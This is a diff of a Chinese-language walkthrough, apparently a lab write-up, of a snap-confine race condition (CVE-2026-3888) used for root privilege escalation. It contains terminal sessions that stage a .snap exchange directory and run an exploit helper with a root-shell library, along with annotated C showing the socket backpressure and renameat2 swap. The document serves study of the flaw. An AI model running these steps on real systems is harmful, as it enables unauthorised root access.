@@ -491,71 +491,41 @@ mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange
 #### 我们.exchange用真实库目录中的所有库的副本填充，再加上我们的恶意载荷。
 #### 在第二个terminal
 ```
-jonathan@snapped:~$ cd /proc/3715/cwd
-jonathan@snapped:/proc/3715/cwd$ ls -al
-total 12
-drwxrwxrwt  4 root root 4096 Apr 15 03:07 .
-drwxr-xr-x 21 root root  540 Apr 15 03:05 ..
-drwxr-xr-x  4 root root 4096 Apr 15 03:05 .snap
-drwxrwxrwt  2 root root 4096 Apr 15 02:52 .X11-unix
-jonathan@snapped:/proc/3715/cwd$ ls -al
-total 4
-drwxrwxrwt  2 root root 4096 Apr 15 03:09 .
-drwxr-xr-x 21 root root  540 Apr 15 03:05 ..
-```
-```
 jonathan@snapped:/proc/3260/cwd$ ls -la
 total 4
 drwxrwxrwt  2 root root 4096 Apr 15 08:08 .
 drwxr-xr-x 21 root root  540 Apr 15 08:04 ..
-jonathan@snapped:/proc/3260/cwd$ mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange
+jonathan@snapped:/proc/3260/cwd$ mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange		//很重要的一步
 jonathan@snapped:/proc/3260/cwd$ ls -la
 total 8
 drwxrwxrwt  3 root     root     4096 Apr 15 08:09 .
 drwxr-xr-x 21 root     root      540 Apr 15 08:04 ..
 drwxrwxr-x  3 jonathan jonathan 4096 Apr 15 08:09 .snap
+//预期的错误，为了保留/tmp其下的目录
 jonathan@snapped:/proc/3260/cwd$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c \
   "env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
   --base snapd snap.firefox.hook.configure /nonexistent; exit"
 Running as unit: snap.d1776255002.scope; invocation ID: adbde2af581f402ea085e2bf395021f4
 cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_swHqfq//dev: No such file or directory
 
-```
-```
-
-jonathan@snapped:/proc/3715/cwd$
-jonathan@snapped:/proc/3715/cwd$ cd ~
-//预期的错误，为了保留/tmp其下的目录
-jonathan@snapped:~$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c \
-> "env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
-> --base snapd snap.firefox.hook.configure /nonexistent; exit"
-Running as unit: snap.d1776237238.scope; invocation ID: 303209263a1c4e738ebdd3e4c8ee7375
-cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_mSumBN//dev: No such file or directory
-
-jonathan@snapped:/proc/3566/cwd$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c "env -i SNAP_InsTANCE_NAME=firefox /usr/lib/snapd/snap-confine \                                                          
---base snapd snap.firefox.hook.configure /nonexistent; exit"
-Running as unit: snap.d1776238729.scope; invocation ID: 7dc9beb498834a09840c866c2a9ffa2f
-SNAP_INSTANCE_NAME is not set
-jonathan@snapped:/proc/3566/cwd$ ls -al
-total 4
-drwxrwxrwt  2 root root 4096 Apr 15 03:38 .
-drwxr-xr-x 21 root root  540 Apr 15 03:34 ..
-
-jonathan@snapped:/proc/3566/cwd$ ~/firefox_2404 ~/librootshell.so
+jonathan@snapped:/proc/3260/cwd$ ~/firefox_2404 ~/librootshell.so
 [*] CVE-2026-3888-firefox 24.04 helper
 [*] Original research by Qualys (https://www.qualys.com)
-[*] CWD: /proc/3566/cwd
+[*] CWD: /proc/3260/cwd
 [*] Setting up .snap and .exchange directory...
 [*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
 [*] Starting race against snap-confine...
-[*] Reading snap-confine output (PID 4241)...
-DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1776238822.629405"}
+[*] Reading snap-confine output (PID 4178)...
+DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1776255039.715040"}
 DEBUG: umask reset, old umask was   02
 DEBUG: security tag: snap.firefox.hook.configure
+DEBUG: executable:   /bin/sh
+DEBUG: confinement:  non-classic
+DEBUG: base snap:    core22
+DEBUG: ruid: 1000, euid: 0, suid: 0
+DEBUG: rgid: 1000, egid: 1000, sgid: 1000
+DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
 <SNIP>
-
-
-
 ```
 #### The Race Window 竞赛窗口
 #### 第三个terminal
@@ -627,6 +597,9 @@ jonathan@snapped:~$ cd /proc/3566/cwd
 jonathan@snapped:/proc/3566/cwd$ cp /usr/bin/busybox ./tmp/sh
 cp: cannot create regular file './tmp/sh': No such file or directory
 ```
+<details>
+<summary>漏洞原理</summary>
+	
 ```
 竞争窗口存在于设置snap-confine后发出的两条特定调试消息之间：SNAPD_DEBUG=1
 触发点（步骤 1 完成）：
@@ -661,7 +634,12 @@ snap-confine同步写入这些调试信息
 如果我们能让 stderr 文件描述符在每次写入字节时都阻塞，snap-confine那么输出的每个字符都会暂停。
 这正是背压技术的原理--The backpressure technique。
 ```
+</details>
+
 ### How Backpressure Works -- AF/UNXI背压技术
+<details>
+<summary>代码解析</summary>
+	
 ```
 //步骤 1：创建缓冲区最小的套接字对
 int sv[2];
@@ -760,6 +738,8 @@ if (syscall(SYS_renameat2,
 //交换完成后，父进程会继续读取文件，从而解除 snap-confine 的阻塞，使其能够继续执行。
 //snap-confine 恢复运行，进入步骤 3，并以 root 权限挂载攻击者拥有的文件。
 ```
+</details>
+
 #### 为什么这种方法如此有效
 #### 反压技术将微秒级的比赛窗口转化为无限长的暂停。其主要特性如下：
 ```
@@ -773,7 +753,10 @@ renameat2(RENAME_EXCHANGE)	原子交换，无中间不一致状态
 #### 结果就是，一旦前提条件满足，就会出现100%获胜的竞争条件，因为根本不存在竞争——攻击者将执行过程串行化。
 
 -----------------------------------------------------------------------------------------
-### 官方的方式行不通 firefox.c的代码不对劲,而且超级看不懂官方的人话
+### 官方的方式行不通的操作 虽然firefox.c的代码不太一样,不对的原因少在执行一条官方没有提示的命令：
+```
+jonathan@snapped:/proc/3260/cwd$ mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange
+```
 #### 对于 /usr/lib/x86_64-linux-gnu 目录的模拟序列是：
 ```
 1. mount --bind /usr/lib/x86_64-linux-gnu → /tmp/.snap/usr/lib/x86_64-linux-gnu
